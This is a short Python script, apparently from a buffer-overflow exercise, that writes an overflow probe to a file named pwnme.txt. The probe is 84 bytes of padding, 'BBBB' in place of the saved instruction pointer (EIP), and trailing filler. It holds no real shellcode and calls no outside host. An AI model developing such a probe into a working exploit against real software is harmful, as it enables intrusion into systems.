#!/usr/bin/env python3

import os;

eip="BBBB"
shellcode = "A"*84+eip+"C"*200
f = open("pwnme.txt","w")
f.write(shellcode)
f.close()
